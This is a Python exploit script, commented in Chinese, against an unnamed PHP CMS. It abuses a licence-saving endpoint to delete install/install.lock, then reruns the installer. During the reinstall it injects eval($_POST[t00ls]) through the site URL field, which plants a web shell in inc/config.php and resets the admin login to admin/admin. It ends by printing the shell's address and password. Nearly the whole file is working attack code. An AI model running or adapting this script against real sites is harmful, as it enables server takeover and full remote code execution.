"""
    先删除install/install.lock , 然后重装GETSHELL
"""

import requests,sys,re

class getShell(object):
    def __init__(self,url,host,user,pwd,port):
        self.url = url
        self.port = port
        self.host = host
        self.user = user
        self.pwd = pwd
        self.path = "install/install.lock"
        self.headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
            "Referer":"http://www.t00ls.net"
        }

    # 删除install.lock
    def delInstall(self):
        del_url = self.url + "/user/licence_save.php?action=modify"
        data = {
            # title=1&img=1&oldimg=favicon.ico&id=1
            "title": 1,
            "img": 1,
            "oldimg": self.path,
            "id": 1
        }
        # print(data)
        requests.post(del_url, headers=self.headers, data=data)
        url = "{}/install/install.lock".format(self.url)
        code = requests.head(url,headers=self.headers).status_code
        if code==404:
            print("[+] 删除install.lock成功，准备重装")
        else:
            print("[-] 删除install.lock失败")
            sys.exit()

    # 重装CMS  GETSHELL
    def install(self):
        url = self.url+"/install/index.php"

        # 获取重装的token
        res = requests.post(url,headers=self.headers,data={'step':3})
        re_ = re.compile(r'<input name="token" type="hidden"  value="(\w*)"/>')
        try:
            token = re_.findall(res.text)[0]
        except:
            print("[-] 无法获取重装所需要的Token，请手动安装")
            sys.exit()
        #admin=admin&adminpwd=admin&adminpwd2=admin
        #print(token)
        data = {
            'step':5,
            'token':token,
            'db_host':self.host,
            'db_user':self.user,
            'db_port':self.port,
            'db_pass':self.pwd,
            'db_name':'baidu_com',
            'url':"http%3A%2F%2F127.0.0.1');eval($_POST[t00ls]);echo 'admintony';//",
            'admin':'admin',
            'adminpwd':'admin',
            'adminpwd2':'admin'
        }
        # 重装CMS
        res = requests.post(url, headers=self.headers, data=data)
        #print(res.text)
        # 生成install.lock
        res = requests.post(url,headers=self.headers,data={'step':6})
        if "成功安装" in res.text:
            print("[+] CMS安装成功，正在测试shell是否写入")
        else:
            print("[-] CMS安装失败!")
            sys.exit()
        shell_url = self.url+"/inc/config.php"
        res = requests.get(shell_url,headers=self.headers)
        if "admintony" in res.text:
            print("[+] SHELL地址为{} 密码为：t00ls".format(shell_url))
